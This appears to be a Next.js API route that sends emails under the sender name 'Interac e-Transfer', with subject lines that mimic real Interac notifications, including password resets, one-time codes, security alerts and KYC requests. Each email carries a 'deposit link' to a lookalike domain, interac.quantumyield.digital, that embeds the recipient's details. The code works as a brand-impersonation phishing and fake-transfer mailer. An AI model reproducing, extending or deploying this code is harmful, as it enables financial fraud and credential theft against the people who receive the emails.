import { NextResponse } from "next/server"
import { generateEmailByTemplateId } from "@/lib/email-template-generators"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const {
      recipientEmail,
      recipientName,
      amount,
      message,
      securityQuestion,
      securityAnswer,
      templateId,
      language,
    } = body

    // Validate required fields
    if (!recipientEmail || !recipientName || !amount) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(recipientEmail)) {
      return NextResponse.json({ error: "Invalid email address" }, { status: 400 })
    }

    // Validate amount
    const amountNum = Number.parseFloat(String(amount).replace(/,/g, ""))
    if (isNaN(amountNum) || amountNum <= 0) {
      return NextResponse.json({ error: "Invalid amount" }, { status: 400 })
    }

    // Check for Resend API key
    const resendApiKey = process.env.RESEND_API_KEY
    if (!resendApiKey) {
      console.error("[v0] RESEND_API_KEY is not set")
      return NextResponse.json(
        { error: "Email service not configured. Please add RESEND_API_KEY to environment variables." },
        { status: 500 },
      )
    }

    const transferId = `INTC-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 9).toUpperCase()}`
    const timestamp  = new Date().toISOString()

    // Build deposit link — client portal URL with all transfer params embedded
    // so the /deposit-portal/client page can read them from the URL on arrival
    const depositParams = new URLSearchParams({
      transferId,
      amount:        amountNum.toString(),
      recipient:     recipientEmail,
      recipientName,
      bankName:      "QuantumYield",
      message:       message || "",
      timestamp,
    })
    const depositLink = `https://interac.quantumyield.digital/deposit-portal/client?${depositParams.toString()}`

    // Resolve template ID — fall back to transfer-received for /send page
    const resolvedBase = templateId || "transfer-received"
    const resolvedId = language === "fr" ? `${resolvedBase}-fr` : resolvedBase



    // Generate email HTML using the 33-template system
    const emailHtml = generateEmailByTemplateId(resolvedId, {
      recipientName,
      amount: amountNum,
      message: message || undefined,
      securityQuestion: securityQuestion || undefined,
      securityAnswer: securityAnswer || undefined,
      transferId,
      depositLink,
      senderName: "QuantumYield Treasury",
      institution: "QuantumYield | Treasury & Vault Portal",
      bankName: "QuantumYield",
    })

    if (!emailHtml) {
      console.error("[v0] Unknown template ID:", resolvedId)
      return NextResponse.json({ error: `Unknown template: ${resolvedId}` }, { status: 400 })
    }

    // Build subject based on template type
    const subjectMap: Record<string, string> = {
      "transfer-received":      `You've received an Interac e-Transfer for ${formatAmount(amountNum)}`,
      "transfer-sent":          `Your Interac e-Transfer of ${formatAmount(amountNum)} was sent`,
      "transfer-pending":       `Action Required: Interac e-Transfer of ${formatAmount(amountNum)} pending`,
      "transfer-cancelled":     `Your Interac e-Transfer of ${formatAmount(amountNum)} was cancelled`,
      "transfer-expired":       `Your Interac e-Transfer of ${formatAmount(amountNum)} has expired`,
      "deposit-completed":      `Your Interac e-Transfer deposit of ${formatAmount(amountNum)} is complete`,
      "deposit-failed":         `Action Required: Your deposit of ${formatAmount(amountNum)} failed`,
      "deposit-reminder":       `Reminder: Unclaimed Interac e-Transfer of ${formatAmount(amountNum)}`,
      "deposit-instructions":   `How to deposit your Interac e-Transfer`,
      "auto-deposit-enabled":   `Interac e-Transfer Auto-Deposit Enabled`,
      "security-question-updated": `Your Interac e-Transfer security settings were updated`,
      "suspicious-activity":    `Security Alert: Unusual activity on your account`,
      "password-reset":         `Reset your Interac e-Transfer password`,
      "two-factor-enabled":     `Two-Factor Authentication Enabled`,
      "login-notification":     `New sign-in to your Interac e-Transfer account`,
      "account-verified":       `Your account has been verified`,
      "profile-updated":        `Your profile was updated`,
      "bank-linked":            `Bank account linked successfully`,
      "limit-increase":         `Your transfer limit has been increased`,
      "money-request":          `${recipientName} is requesting ${formatAmount(amountNum)}`,
      "request-accepted":       `Your money request was accepted`,
      "request-declined":       `Your money request was declined`,
      "transfer-receipt":       `Your Interac e-Transfer receipt`,
      "scheduled-transfer":     `Reminder: Scheduled Interac e-Transfer tomorrow`,
      "deposit-on-hold":        `Your deposit is temporarily on hold`,
      "two-factor-code":        `Your one-time verification code`,
      "welcome-onboard":        `Welcome to Interac e-Transfer via QuantumYield`,
      "account-suspended":      `Your account has been temporarily suspended`,
      "referral-bonus":         `You've earned a referral bonus!`,
      "kyc-verification":       `Action Required: Verify your identity`,
      "aml-hold":               `Transaction hold applied — compliance review`,
      "monthly-statement":      `Your Interac e-Transfer monthly statement is ready`,
      "large-transaction-review": `Large transaction — additional verification required`,
    }

    const subject =
      subjectMap[resolvedBase] ||
      `Interac e-Transfer Notification — ${formatAmount(amountNum)}`

    // Prefix subject with [FR] indicator when French
    const finalSubject = language === "fr" ? `[FR] ${subject}` : subject

    // ── Build and sanitize the `from` address ────────────────────────────────
    // Resend requires one of:
    //   • "email@verified-domain.com"
    //   • "Display Name <email@verified-domain.com>"
    // The env var RESEND_FROM_EMAIL should be the raw email address only (e.g. "noreply@yourdomain.com")
    // or a full formatted string. We always inject the "Interac e-Transfer" display name.
    const SENDER_NAME = "Interac e-Transfer"
    const rawFromEnv  = (process.env.RESEND_FROM_EMAIL || "").trim()

    // Extract just the email address from the env value (strip any existing display name wrapper)
    const emailOnly = rawFromEnv.includes("<")
      ? rawFromEnv.match(/<([^>]+)>/)?.[1]?.trim() ?? rawFromEnv
      : rawFromEnv

    // Validate the extracted email
    const fromEmailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailOnly || !fromEmailRegex.test(emailOnly)) {
      console.error("[send-interac] RESEND_FROM_EMAIL is missing or malformed:", rawFromEnv)
      return NextResponse.json(
        {
          error:
            "Email service is misconfigured: RESEND_FROM_EMAIL must be a valid address " +
            "(e.g. noreply@yourdomain.com). Please update it in the Vars settings.",
        },
        { status: 500 },
      )
    }

    // Compose the final `from` string Resend will accept
    const fromAddress = `${SENDER_NAME} <${emailOnly}>`

    if (emailOnly.endsWith("@resend.dev")) {
      console.warn(
        "[send-interac] Using a @resend.dev sender — Resend only delivers to the verified account owner. " +
        "Set RESEND_FROM_EMAIL to an address on your verified domain.",
      )
    }

    // ── Send via Resend ────────────────────────────────────────────────���──────
    const resendPayload = {
      from:    fromAddress,
      to:      [recipientEmail],
      subject: finalSubject,
      html:    emailHtml,
    }

    const resendResponse = await fetch("https://api.resend.com/emails", {
      method:  "POST",
      headers: {
        Authorization:  `Bearer ${resendApiKey}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(resendPayload),
    })

    const resendData = await resendResponse.json()

    if (!resendResponse.ok) {
      const errorMsg = resendData?.message || resendData?.name || JSON.stringify(resendData)
      const hint =
        resendResponse.status === 422
          ? ` (422) — The 'from' address "${fromAddress}" was rejected. Ensure RESEND_FROM_EMAIL uses a domain verified in your Resend dashboard.`
          : ""
      console.error("[send-interac] Resend error:", resendResponse.status, errorMsg, "from:", fromAddress)
      return NextResponse.json(
        { error: `Email delivery failed: ${errorMsg}${hint}` },
        { status: 500 },
      )
    }

    return NextResponse.json({
      success: true,
      transferId,
      emailId: resendData?.id,
      message: "Interac e-Transfer sent successfully",
    })
  } catch (error) {
    console.error("[v0] Error in send-interac API:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}

function formatAmount(n: number): string {
  return new Intl.NumberFormat("en-CA", { style: "currency", currency: "CAD" }).format(n)
}
